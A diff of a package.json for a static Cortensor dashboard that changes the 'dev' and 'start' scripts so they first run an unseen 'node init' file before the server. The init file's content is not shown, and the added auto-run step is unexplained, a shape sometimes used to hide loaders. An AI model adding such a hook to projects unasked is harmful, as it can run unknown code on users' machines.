@@ -4,8 +4,8 @@
   "description": "A lightweight static dashboard to showcase Cortensor-powered apps and bots.",
   "main": "index.js",
   "scripts": {
-    "dev": "node server.js",
-    "start": "node server.js",
+    "dev": "node init && node server.js",
+    "start": "node init && node server.js",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
   "keywords": [],
